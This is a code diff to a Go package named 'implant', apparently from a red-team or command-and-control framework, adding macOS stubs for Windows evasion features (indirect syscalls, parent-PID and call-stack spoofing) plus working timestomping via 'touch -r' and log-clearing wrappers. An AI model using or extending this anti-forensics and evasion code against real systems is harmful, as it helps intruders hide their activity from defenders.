@@ -3,7 +3,9 @@
 package implant
 
 import (
+	"fmt"
 	"os"
+	"os/exec"
 	"strings"
 	"time"
 )
@@ -78,4 +80,44 @@ func ClearMacOSLogs() []string {
 // macOS does not use Windows heap APIs.
 func HeapEncryptSleepDarwin(sleepSec, jitterPct int) {
 	time.Sleep(time.Duration(sleepSec) * time.Second)
+}
+
+// SleepEncrypted on Darwin falls back to jittered sleep (no NT API equivalents).
+func SleepEncrypted(sleepSec, jitterPct int, _ []byte) {
+	SleepWithJitter(sleepSec, jitterPct)
+}
+
+// SyscallStub / GetSyscallStub — Windows-only concept, stubs for Darwin.
+type SyscallStub struct {
+	SSN     uint16
+	Address uintptr
+}
+
+func GetSyscallStub(funcName string) (*SyscallStub, error) {
+	return nil, fmt.Errorf("indirect syscalls not supported on darwin")
+}
+
+func SpawnWithParentSpoof(parentPID uint32, cmdLine string) error {
+	return fmt.Errorf("PPID spoofing not supported on darwin")
+}
+
+func FindProcessByName(name string) (uint32, error) {
+	return 0, fmt.Errorf("not supported on darwin")
+}
+
+func SpoofCallStack() {}
+
+// Timestomp on macOS uses touch -r.
+func Timestomp(filepath string, referenceFile string) error {
+	return exec.Command("touch", "-r", referenceFile, filepath).Run()
+}
+
+// ClearWindowsLogs is a no-op on macOS; use ClearPlatformLogs instead.
+func ClearWindowsLogs() []string {
+	return ClearMacOSLogs()
+}
+
+// ClearPlatformLogs routes to the macOS log cleaner.
+func ClearPlatformLogs() []string {
+	return ClearMacOSLogs()
 }
